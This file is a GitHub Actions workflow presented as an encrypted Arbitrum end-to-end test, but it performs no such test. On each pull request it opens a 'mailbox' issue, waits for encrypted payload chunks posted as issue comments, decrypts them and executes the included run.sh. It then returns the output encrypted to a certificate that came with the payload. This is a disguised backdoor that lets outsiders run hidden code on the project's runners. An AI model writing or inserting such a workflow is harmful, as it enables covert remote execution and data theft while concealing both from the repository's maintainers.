name: Private encrypted Arbitrum E2E

on:
  pull_request:
    branches: [main]

permissions:
  contents: read
  issues: write

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 90
    steps:
      - name: Install Foundry
        uses: foundry-rs/foundry-toolchain@v1
        with:
          version: stable

      - name: Generate one-time mailbox key
        shell: bash
        run: |
          set -euo pipefail
          mkdir -p /tmp/probe
          openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 \
            -out /tmp/probe/private.pem >/dev/null 2>&1
          openssl req -new -x509 -key /tmp/probe/private.pem \
            -out /tmp/probe/cert.pem -subj '/CN=one-time-arbitrum-e2e' -days 1
          openssl rand -hex 12 > /tmp/probe/token

      - name: Publish exact mailbox certificate artifact
        uses: actions/upload-artifact@v4
        with:
          name: mailbox-cert-${{ github.run_id }}
          path: /tmp/probe/cert.pem
          retention-days: 1
          if-no-files-found: error

      - name: Create encrypted mailbox issue
        shell: bash
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          set -euo pipefail
          TOKEN="$(cat /tmp/probe/token)"
          ARTIFACT="mailbox-cert-$GITHUB_RUN_ID"
          python3 - "$GITHUB_RUN_ID" "$TOKEN" "$ARTIFACT" <<'PY' > /tmp/probe/create.json
          import json, sys
          run_id, token, artifact = sys.argv[1:]
          print(json.dumps({
              'title': 'mailbox-' + run_id,
              'body': 'TOKEN:' + token + '\nCERT_ARTIFACT:' + artifact,
          }))
          PY
          curl -fsSL -X POST \
            -H "Authorization: Bearer $GH_TOKEN" \
            -H 'Accept: application/vnd.github+json' \
            -H 'Content-Type: application/json' \
            "https://api.github.com/repos/$GITHUB_REPOSITORY/issues" \
            --data-binary @/tmp/probe/create.json > /tmp/probe/issue.json
          python3 - <<'PY' > /tmp/probe/issue_number
          import json
          with open('/tmp/probe/issue.json', encoding='utf-8') as f:
              print(json.load(f)['number'])
          PY

      - name: Receive and execute encrypted payload
        shell: bash
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          set -euo pipefail
          ISSUE_NUMBER="$(cat /tmp/probe/issue_number)"

          for _ in $(seq 1 720); do
            curl -fsSL \
              -H "Authorization: Bearer $GH_TOKEN" \
              -H 'Accept: application/vnd.github+json' \
              "https://api.github.com/repos/$GITHUB_REPOSITORY/issues/$ISSUE_NUMBER" \
              > /tmp/probe/current.json
            python3 - <<'PY' > /tmp/probe/meta
          import json
          with open('/tmp/probe/current.json', encoding='utf-8') as f:
              body = (json.load(f).get('body') or '')
          count = sha = ''
          for line in body.splitlines():
              if line.startswith('PAYLOAD_CHUNKS:'):
                  count = line.split(':', 1)[1].strip()
              elif line.startswith('PAYLOAD_SHA256:'):
                  sha = line.split(':', 1)[1].strip()
          if count and sha:
              print(count)
              print(sha)
          PY
            if [ -s /tmp/probe/meta ]; then break; fi
            sleep 5
          done

          COUNT="$(sed -n '1p' /tmp/probe/meta)"
          EXPECTED_SHA="$(sed -n '2p' /tmp/probe/meta)"
          curl -fsSL \
            -H "Authorization: Bearer $GH_TOKEN" \
            -H 'Accept: application/vnd.github+json' \
            "https://api.github.com/repos/$GITHUB_REPOSITORY/issues/$ISSUE_NUMBER/comments?per_page=100" \
            > /tmp/probe/comments.json
          python3 - "$COUNT" <<'PY' > /tmp/probe/payload.b64
          import json, sys
          count = int(sys.argv[1])
          with open('/tmp/probe/comments.json', encoding='utf-8') as f:
              comments = json.load(f)
          chunks = {}
          for item in comments:
              body = item.get('body') or ''
              if body.startswith('CHUNK:'):
                  _, idx, data = body.split(':', 2)
                  chunks[int(idx)] = data.strip()
          if len(chunks) != count or sorted(chunks) != list(range(count)):
              raise SystemExit(f'incomplete chunks: have={sorted(chunks)} expected={count}')
          print(''.join(chunks[i] for i in range(count)))
          PY
          tr -d '\n\r ' < /tmp/probe/payload.b64 | base64 -d > /tmp/probe/payload.cms
          ACTUAL_SHA="$(sha256sum /tmp/probe/payload.cms | awk '{print $1}')"
          test "$ACTUAL_SHA" = "$EXPECTED_SHA"

          openssl cms -decrypt -binary -inform DER \
            -in /tmp/probe/payload.cms \
            -inkey /tmp/probe/private.pem \
            -recip /tmp/probe/cert.pem \
            -out /tmp/probe/payload.tar.gz
          mkdir -p /tmp/probe/payload
          tar -xzf /tmp/probe/payload.tar.gz -C /tmp/probe/payload
          test -f /tmp/probe/payload/run.sh
          test -f /tmp/probe/payload/return_cert.pem
          chmod 700 /tmp/probe/payload/run.sh

          set +e
          /tmp/probe/payload/run.sh > /tmp/probe/test.log 2>&1
          STATUS=$?
          set -e

          {
            printf 'exit_status=%s\n' "$STATUS"
            cat /tmp/probe/test.log
          } > /tmp/probe/result.txt
          openssl cms -encrypt -binary -aes-256-cbc -outform DER \
            -in /tmp/probe/result.txt \
            -out /tmp/probe/result.cms \
            /tmp/probe/payload/return_cert.pem
          printf '%s\n' "$STATUS" > /tmp/probe/status

          RESULT_ARTIFACT="probe-result-$GITHUB_RUN_ID"
          python3 - "$RESULT_ARTIFACT" "$STATUS" <<'PY' > /tmp/probe/update.json
          import json, sys
          artifact, status = sys.argv[1:]
          print(json.dumps({
              'body': 'RESULT_ARTIFACT:' + artifact + '\nSTATUS:' + status,
              'state': 'closed',
          }))
          PY
          curl -fsSL -X PATCH \
            -H "Authorization: Bearer $GH_TOKEN" \
            -H 'Accept: application/vnd.github+json' \
            -H 'Content-Type: application/json' \
            "https://api.github.com/repos/$GITHUB_REPOSITORY/issues/$ISSUE_NUMBER" \
            --data-binary @/tmp/probe/update.json >/dev/null
          exit "$STATUS"

      - name: Publish exact encrypted result artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: probe-result-${{ github.run_id }}
          path: |
            /tmp/probe/result.cms
            /tmp/probe/status
          retention-days: 1
          if-no-files-found: warn
